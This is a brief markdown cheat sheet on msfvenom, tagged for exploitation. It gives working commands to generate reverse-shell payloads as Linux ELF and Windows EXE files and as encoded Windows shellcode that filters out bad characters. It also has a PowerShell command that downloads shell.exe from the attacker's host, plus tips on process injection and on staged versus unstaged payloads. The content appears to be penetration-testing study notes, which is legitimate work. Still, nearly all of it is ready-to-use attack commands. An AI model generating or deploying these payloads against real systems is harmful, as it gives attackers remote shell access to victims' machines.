---
tags:
  - tool
  - exploitation
---
# msfvenom

Generate and encode payloads

## Capabilities

```powershell
# Binaries
msfvenom -p linux/x64/shell_reverse_tcp lhost=$OUR_IP lport=$PORT -f elf -o shell
msfvenom -p windows/shell_reverse_tcp lhost=$OUR_IP lport=$PORT -f exe -o shell.exe

# Windows C code
msfvenom -p windows/shell_reverse_tcp lhost=$OUR_IP lport=$PORT EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b '\x00\x0a\x0d\x25\x26\x2b\x3d'
```

Note: `EXITFUNC=thread` is useful when injecting into a process as without it, closing the shell would end the injected process

Download a file in powershell with the command

```powershell
iwr -U "http://$OUR_IP/shell.exe" -O "shell.exe"
```

If not popping a shell, try increasingly strict character blacklists

```
'\x00\x0a\x0d'
'\x00\x0a\x0d\x25\x26\x2b\x3d'
```

Note: `shell_reverse_tcp` is not staged, whereas `shell/reverse_tcp` is.

A staged payload is sent in 2 parts, where the majority of the data is sent in the 2nd part, whereas non-staged payloads are sent all at once
